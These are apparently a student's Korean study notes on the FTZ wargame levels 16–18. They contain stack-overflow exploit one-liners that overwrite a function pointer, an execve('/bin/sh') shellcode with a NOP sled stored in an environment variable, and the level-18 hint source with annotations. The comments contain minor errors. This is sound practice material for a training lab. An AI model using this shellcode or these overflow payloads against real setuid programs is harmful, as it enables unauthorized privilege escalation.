# 시스템 보안 555p level 16

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dda3dda8-5c5b-4631-94b0-4b2b117f9dfb" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/7ba3acba-34dd-4d84-b3fe-a33be6a94ec8" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/b0074931-119c-409c-8932-66cabd74adbf" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/6309ad6d-09f5-4002-89cd-7663eb5708c4" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/21e31d9e-c126-4617-a14b-02f3cdb48c49" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/3d235b2b-dfae-4220-909c-dbdea251a2da" />
<img width="1007" height="1040" alt="image" src="https://github.com/user-attachments/assets/327b7265-12e2-4db6-a77b-2a93406002c3" />

```
@level16
(python -c 'print("a"*40+"\xd0\x84\x04\x08")';cat) | ./attackme

[낮은 주소]
---------------------- EBP-56(0x38)
buf[20]		  a x 20
----------------------
dummy[20]	  a x 20
---------------------- EBP-16(0x10)
*call		  0x080484d0	\xd0\x84\x04\x08
----------------------
crap
---------------------- EBP(SFP)
ebp
----------------------
ret 주소값
----------------------
argc 개수
----------------------
[높은 주소]

@level17
(python -c 'print("a"*40+"\xc3\xfb\xff\xbf")';cat) | ./attackme

[낮은 주소]
---------------------- EBP-56(0x38)
buf[20]		  a x 20
----------------------
dummy[20]	  a x 20
---------------------- EBP-16(0x10)
*call		  쉘 코드 주소 0xbffffbc3	\xc3\xfb\xff\xbf
---------------------- 
crap
---------------------- EBP(SFP)
ebp
----------------------
ret 주소값
----------------------
argc 개수
----------------------
[높은 주소]


export SHELLCODE=\
$(python -c 'print("\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\
\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80")')

x90"*10 는 nonopperate코드로 아무것도 실행하지 않겠다 알아둬야 함

```

## 1. 주소 찾는 코드

```c
#include <stdio.h>          # 화면에 출력할 때 필요한 기능
#include <stdlib.h>         # 시스템 기능 (getenv 같은 거)

# 프로그래 시작 'argc' 입력 개수/ 'argv' 입력 내용
int main(int argc, char *argv[])

# env = 주소 담는 변수 (어디 있는지 위치 저장하는 변수) 
char *env;

#SHELLCODE라는 환경변수 어디 있는지 찾아라
env = getenv(arvc[1]);

```


# level 18
```

[level18@ftz level18]$ cp attackme tmp
[level18@ftz level18]$ cat hint

#include <stdio.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
void shellout(void);
int main()
{
  char string[100];
  int check;
  int x = 0;
  int count = 0;
  fd_set fds;
  printf("Enter your command: ");
  fflush(stdout);
  while(1)
    {
      if(count >= 100)
        printf("what are you trying to do?\n");
      if(check == 0xdeadbeef)
        shellout();
      else
        {
          FD_ZERO(&fds);
          FD_SET(STDIN_FILENO,&fds);

          if(select(FD_SETSIZE, &fds, NULL, NULL, NULL) >= 1)
            {
              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)
                    {
                      case '\r':
                      case '\n':
                        printf("\a");
                        break;
                      case 0x08:
                        count--;
                        printf("\b \b");
                        break;
                      default:
                        string[count] = x;
                        count++;
                        break;
                    }
                }
            }
        }
    }
}

void shellout(void)
{
  setreuid(3099,3099);
  execl("/bin/sh","sh",NULL);
}

              if(FD_ISSET(fileno(stdin),&fds))
                {
                  read(fileno(stdin),&x,1);
                  switch(x)

# 이거 두개는 하나로 보면 됨 엔터가 두가지 동작 합쳐진거 (다음 줄로 넘어가고, 커서가 내려감)
                      case '\r':
                      case '\n':
# beef무을 의미함
                        printf("\a");

# 백슬래쉬임
                        printf("\b \b");
```
체크 변수가 deadbeef가 되면 shellout함수를 호출하게 됨

<img width="874" height="1040" alt="image" src="https://github.com/user-attachments/assets/ba2f9ce0-b1a5-4a67-bc48-03381f24cea2" />


# 571p도 참고해서 해보기

